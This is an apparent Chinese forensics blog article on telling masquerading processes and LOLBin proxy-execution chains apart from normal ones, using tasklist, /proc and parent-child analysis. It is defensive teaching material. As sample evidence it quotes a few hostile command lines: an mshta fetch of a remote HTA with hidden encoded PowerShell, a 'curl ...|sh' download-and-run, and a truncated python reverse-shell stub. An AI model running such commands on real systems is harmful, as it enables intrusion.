---
title: "系统进程检查结果与伪装及LOLBin执行链分析"
date: 2026-06-16T22:20:00+08:00
draft: false
weight: 185
description: "围绕 ps、pstree、tasklist、/proc 等取证结果，分析如何识别伪装进程、异常父子链、LOLBin 代理执行与路径错位。"
categories: ["应急响应", "取证分析"]
tags: ["系统进程检查", "LOLBin", "伪装进程", "tasklist", "/proc", "4688", "Sysmon"]
---

# 系统进程检查结果与伪装及LOLBin执行链分析

`0x02电子取证` 里的 `系统进程检查` 解决的是“机器上现在跑着什么”。到了 `0x03取证分析`，更关键的问题变成：

- 这个进程到底是不是它声称的那个进程
- 它为什么会被拉起
- 它的父子链是否符合系统和业务常态
- 它是在直接执行恶意载荷，还是在借 `mshta`、`regsvr32`、`rundll32`、`powershell` 之类的 LOLBin 代理执行

很多现场误判都出在这里。看见 `svchost.exe`、`fontdrvhost.exe`、`explorer.exe`、`msiexec.exe`，如果只看名字，很容易当成系统组件；但一旦把**路径、父进程、参数、宿主关系、加载模块**合起来看，很多“正常进程”其实根本讲不通。

---

## 0x01 这篇文章要回答什么

围绕 `系统进程检查` 结果，建议优先回答五个问题：

1. **这个名字和这条路径是否匹配？**
2. **这个父进程能不能合理地产生这个子进程？**
3. **这个命令行像正常业务调用，还是像代理执行链？**
4. **这个进程的真实身份，能否被 `/proc/<pid>/exe`、`tasklist /svc`、模块加载、签名信息交叉确认？**
5. **它后面有没有继续触发下载、横向、驻留或外联？**

这五个问题里，只要前面三个已经讲不通，就应当把“看起来合法”升级为“需要重点分析的异常执行链”。

---

## 0x02 公开案例一：Squidoor 把 `cdb.exe` 伪装成 `fontdrvhost.exe`

Palo Alto Networks Unit 42 在 2025 年披露的 Squidoor 案例里，攻击者投放了微软调试器 `cdb.exe`，并将其重命名放在：

- `C:\ProgramData\fontdrvhost.exe`

随后利用这个被重命名的二进制加载和执行后续 shellcode。

这个案例最适合用来提醒蓝队：**进程名看起来像系统组件，不等于它真的是系统组件。**

如果你在现场拿到如下结果：

```text
Image Name: fontdrvhost.exe
PID: 4120
Path: C:\ProgramData\fontdrvhost.exe
Parent: cmd.exe
```

那么风险点不是只有“名字可疑”，而是下面四点同时成立：

- `fontdrvhost.exe` 正常应位于系统目录，不应长期驻留在 `ProgramData`
- 父进程如果是 `cmd.exe`、`powershell.exe`、`wscript.exe`，与正常系统拉起链不匹配
- 如果再看到同时间存在下载、解压、横向或注册驻留动作，这条链就不是“误报”
- 如果原始文件名、签名、哈希进一步证实它不是系统组件，那么“伪装成立”强度很高

公开来源：

- Unit 42: https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/

---

## 0x03 公开案例二：Red Canary 关于伪装进程与路径错位的经验

Red Canary 在进程伪装分析里专门强调，像 `svchost.exe` 这样的系统进程，不能只按名字判断，而应该一起核对：

- 固定路径
- 常见命令行
- 内部原始文件名
- 正常父进程

以 `svchost.exe` 为例，常见正常特征通常是：

- 路径位于 `C:\Windows\System32\svchost.exe` 或 `C:\Windows\SysWOW64\svchost.exe`
- 命令行里常见 `-k`
- 父进程通常与服务宿主关系匹配

如果你在结果里看到：

```text
ProcessName: svchost.exe
Path: C:\Users\Public\svchost.exe
CommandLine: C:\Users\Public\svchost.exe
ParentImage: C:\Windows\System32\cmd.exe
```

那么单看进程名毫无意义，真正异常的是：

- 名称正确但路径错误
- 本应由服务机制拉起，却变成 `cmd.exe` 手工拉起
- 本应带 `-k` 这类服务组参数，却没有对应服务命令行语义

公开来源：

- Red Canary: https://redcanary.com/blog/threat-detection/process-masquerading/

---

## 0x04 公开案例三：LOLBin 链里最该盯的是“它后面又拉起了谁”

ANY.RUN 总结 LOLBin 攻击时强调，真正高价值的不是“看见了 `mshta.exe`”，而是：

- `mshta.exe` 是否去处理了来自网络或临时目录的内容
- 它是否继续拉起了隐藏 PowerShell
- 进程链是否继续触发下载、解码、内存执行或新文件落地

例如下面这条现场结果：

```text
ParentImage: C:\Windows\explorer.exe
Image: C:\Windows\System32\mshta.exe
CommandLine: mshta.exe http://x.x.x.x/a.hta
ChildImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ChildCommandLine: powershell.exe -w hidden -enc ...
```

单独看 `mshta.exe` 只能说明“调用了系统组件”，但把整条链串起来后，结论会升级成：

- 用户或前序进程触发了 HTA 执行
- HTA 又代理拉起了隐藏 PowerShell
- 如果同时间存在下载文件、Prefetch、Amcache、网络外联，那么已经接近完整执行链

公开来源：

- ANY.RUN: https://any.run/cybersecurity-blog/lolbin-attacks-soc-detection-guide/

---

## 0x05 Windows 里最容易被误判的四类结果

### 1. 同名系统进程

最常见的错误是：

- 看到 `svchost.exe` 就当正常
- 看到 `explorer.exe` 就当桌面组件
- 看到 `fontdrvhost.exe`、`dllhost.exe`、`taskhostw.exe` 就不再追

正确分析方式不是“这个名字像不像系统进程”，而是：

- 路径是否正确
- 父进程是否合理
- 用户上下文是否合理
- 命令行是否带正常参数

### 2. 脚本宿主与 LOLBin

以下进程不应按“系统自带所以没问题”处理：

- `powershell.exe`
- `cmd.exe`
- `wscript.exe`
- `cscript.exe`
- `mshta.exe`
- `rundll32.exe`
- `regsvr32.exe`
- `certutil.exe`

这些程序的价值就在于它们可以**替别人执行**。因此结论重点永远不是“存在”，而是：

- 谁拉起它
- 它拉起了谁
- 它处理了什么参数
- 它之后落了什么文件

### 3. 被服务、WMI、任务拉起的交互式工具

下面这类结果要高度关注：

```text
ParentImage: C:\Windows\System32\services.exe
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c whoami > C:\ProgramData\a.txt
```

或：

```text
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

它们并不自动等于攻击，但通常意味着：

- 服务执行
- 远程管理
- WMI 执行
- PsExec / SMBExec / 横向工具

这类结果必须回到登录日志、共享访问、服务创建、网络连接去闭环。

### 4. “只有进程，没有参数”

有些攻击者会故意让结果看起来很干净，比如：

- 重命名二进制
- 利用默认参数
- 让系统进程代理加载 DLL
- 通过内存执行让落地内容很少

这时只看 `tasklist` 往往不够，必须补：

- `4688`
- Sysmon `Event ID 1`
- 模块加载
- Prefetch / Amcache
- 路径与文件时间

---

## 0x06 `tasklist` 结果拿到以后怎么判

### 1. `tasklist /v` 的重点不是“谁在运行”，而是谁在不该出现的上下文里运行

例如：

```text
"svchost.exe","7628","Console","2","19,612 K","Running","DESKTOP\alice","0:00:00","暂缺"
```

这个结果就不能简单当作“有一个 svchost”。要先想三件事：

- `svchost.exe` 出现在 `Console` 会话是否合理
- 它是不是以普通用户身份运行
- 同一时间是否还有其他同名 `svchost.exe` 处于标准 `Services` 会话

如果是用户会话、用户身份、路径还不在系统目录，那么就要从“弱异常”升到“重点疑似伪装”。

### 2. `tasklist /svc` 的价值是判断它到底是不是服务宿主

例如正常结果：

```text
映像名称:     svchost.exe
PID:          836
服务    :     BrokerInfrastructure
              DcomLaunch
              PlugPlay
              Power
```

这个结果说明该 `PID` 作为服务宿主是“讲得通”的。

但如果你拿到的是：

```text
映像名称:     svchost.exe
PID:          4488
服务    :     暂缺
用户名  :     DESKTOP\alice
```

那么要重点考虑三种情况：

- 它并不是服务宿主，只是借名伪装
- 它是被注入或被替换后的异常实例
- 它是攻击者手工执行的同名二进制

这时要立刻补查：

- 该 PID 的实际路径
- 该路径创建时间
- 是否存在对应的 `ServiceDLL` 或 `ImagePath`
- 是否存在新的 `7045` / `4697`

### 3. `tasklist /m` 更适合做“这个进程体内装了什么”

如果你查到：

```text
tasklist /m wbem*
```

结果显示某个不该跑 WMI 组件的进程大量加载 `wbem*.dll`，那就说明它并不仅仅是“一个普通进程”，而是在调用管理、查询或代理执行能力。

`tasklist /m` 在分析阶段的价值是：

- 识别异常模块依赖
- 识别被注入或代理调用的上下文
- 验证“这个进程真的是它说的角色吗”

---

## 0x07 `/proc` 结果拿到以后怎么判

Linux 现场里，`ps` 只给你“表象”，`/proc` 才更接近“真实身份”。

### 1. `/proc/<pid>/exe` 用来确认“它实际跑的是谁”

例如：

```text
lrwxrwxrwx 1 root root 0 May 31 14:36 exe -> /usr/bin/ping
```

这个结果的分析意义是：

- 不再依赖进程名显示
- 而是直接确认内核认为该 PID 对应的可执行文件

如果你看到的是：

```text
exe -> /tmp/.sshd
```

但 `ps` 里名字看起来像 `sshd`，那就很关键：

- 说明它不是标准系统路径下的 `sshd`
- 如果父进程也不是 `systemd` 或正常服务管理器，伪装概率很高

### 2. `/proc/<pid>/cmdline` 用来判断它是不是在“借壳执行”

例如：

```text
python3 -c import socket,subprocess,os;...
```

或：

```text
bash -c curl http://x.x.x.x/a.sh|sh
```

这种结果通常比单纯“进程叫 python3/bash”更有价值，因为它直接把执行意图暴露出来。

判断思路是：

- 解释器本身不是结论
- 内联命令、下载器、反弹 shell 参数，才是定性关键

### 3. `/proc/<pid>/cwd` 用来判断它从哪类目录起跑

如果工作目录落在以下位置，要显著提高怀疑等级：

- `/tmp`
- `/var/tmp`
- `/dev/shm`
- 用户家目录隐藏目录
- Web 目录可写路径

因为这往往意味着：

- 临时落地
- WebShell 派生执行
- 运维脚本伪装
- 解压后直接运行

### 4. `/proc/<pid>/environ` 用来判断它是不是被环境污染

分析重点不是把所有环境变量看一遍，而是看：

- `LD_PRELOAD`
- `LD_LIBRARY_PATH`
- 异常 `PATH`
- 伪装工作目录

如果你在高风险进程里看到：

```text
LD_PRELOAD=/tmp/libhook.so
LD_LIBRARY_PATH=/tmp/.x
```

这类结果就不能再当作普通执行，而要考虑：

- 动态库劫持
- 用户态钩子
- 恶意库注入

### 5. `/proc/<pid>/maps` 和 `/proc/<pid>/fd` 用来判断它“碰了什么”

如果 `maps` 出现来自临时目录、用户目录、隐藏目录的共享库：

```text
7f... r-xp ... /tmp/libcurl-update.so
```

那么它说明的不是“进程存在”，而是：

- 该进程已实际加载该库
- 该库参与了运行时执行
- 如果库名又伪装成系统组件，则更接近驻留或注入

`fd` 则更适合判断：

- 当前打开的脚本
- 正在处理的落地文件
- 被利用的管道、socket、日志文件

---

## 0x08 正常父子链和异常父子链怎么区分

### 1. 先建立“系统常态”再判断异常

下面这些父子关系通常更接近系统或用户常态：

- `explorer.exe -> chrome.exe`
- `services.exe -> 某正常服务 EXE`
- `systemd -> sshd`
- `sshd -> bash`

但下面这些链一旦出现，就应优先分析：

- `WINWORD.EXE -> powershell.exe`
- `chrome.exe -> mshta.exe`
- `wscript.exe -> cmd.exe`
- `services.exe -> cmd.exe`
- `WmiPrvSE.exe -> powershell.exe`
- `taskeng.exe -> 位于 AppData 的系统同名程序`
- `systemd -> bash -c curl|sh`
- `nginx/apache2 -> sh/python/perl`

### 2. “能出现”不等于“在这个场景下合理”

例如：

- `powershell.exe` 在运维主机上出现不奇怪
- 但如果它由 `WINWORD.EXE` 拉起，就不再是普通运维链

又例如：

- `cmd.exe` 可能是管理员日常使用
- 但如果它由 `services.exe` 拉起，并紧接着创建服务、写文件、连共享，就更接近横向或驻留

分析阶段要做的是**场景化判断**，不是词典式判断。

---

## 0x09 哪些结果可以把“怀疑”升级到“伪装成立”

下面这些条件越多，结论越强：

### 弱证据

- 名称像系统进程
- 路径不在标准目录
- 父子关系不常见

### 中等证据

- 命令行不符合该系统进程常态
- `tasklist /svc` 查不到合理服务关系
- `/proc/<pid>/exe` 指向异常路径
- 同时间有来自用户目录、临时目录的文件落地

### 强证据

- 签名、原始文件名、哈希明确不属于系统文件
- 该进程后续又拉起 LOLBin、下载器、横向工具
- 同时间发生新服务、计划任务、注册表驻留、外联
- Prefetch / Amcache / 4688 / Sysmon 能形成闭环

换句话说，**路径错位只能证明“像伪装”，路径错位加父子链异常再加后续恶意动作，才能更稳地写成“伪装执行成立”。**

---

## 0x0A 一条现场可直接套用的分析流程

如果你刚从 `系统进程检查` 拿到一批结果，建议按下面顺序处理：

1. 先筛系统同名进程是否跑在异常路径
2. 再筛脚本宿主和 LOLBin 是否由异常父进程拉起
3. 再查这些进程是否继续拉起下载、解码、服务创建、横向工具
4. Windows 侧补 `tasklist /svc`、`4688`、Sysmon `1`
5. Linux 侧补 `/proc/<pid>/exe`、`cmdline`、`cwd`、`maps`
6. 最后把文件时间、网络外联、驻留点串成闭环

这样处理后，很多“名字可疑但说不清”的结果，会快速收敛成下面三类：

- 正常系统/运维进程
- 需要继续观察的弱异常
- 可以进入攻击链的强异常执行点

---

## 0x0B 建议整理成什么交付表

| 时间 | 主体进程 | 路径 | 父进程 | 关键结果 | 关联证据 | 结论 |
| --- | --- | --- | --- | --- | --- | --- |
| 01:12:03 | `svchost.exe` | `C:\Users\Public\svchost.exe` | `cmd.exe` | 路径错位，无 `-k` | 4688、外联 | 伪装进程高疑似 |
| 01:13:11 | `mshta.exe` | `System32` | `chrome.exe` | 远程 HTA | 下载记录、PowerShell 子进程 | LOLBin 代理执行 |
| 01:14:22 | `fontdrvhost.exe` | `C:\ProgramData\fontdrvhost.exe` | `powershell.exe` | 名称伪装 | 新文件、C2 连接 | 伪装载荷运行成立 |
| 02:03:51 | `sshd` | `/tmp/.sshd` | `bash` | `/proc/<pid>/exe` 异常 | `cwd` 在 `/tmp` | Linux 伪装后门高疑似 |

---

## 0x0C 总结

`系统进程检查` 在 `0x02` 阶段只是一个入口，但在 `0x03` 阶段，它真正的价值不是“看见进程”，而是**把进程还原回执行语义**。

也就是说，看到一条进程结果之后，最终要回答的不是：

- 这是不是一个可疑名字

而是：

- 它真实是谁
- 谁把它拉起来的
- 它借了谁的壳执行
- 它后面把攻击链推进到了哪一步

当你能把 `tasklist`、`/proc`、父子链、路径和后续行为串起来时，`系统进程检查` 才真正从“列清单”升级成“还原攻击链”。
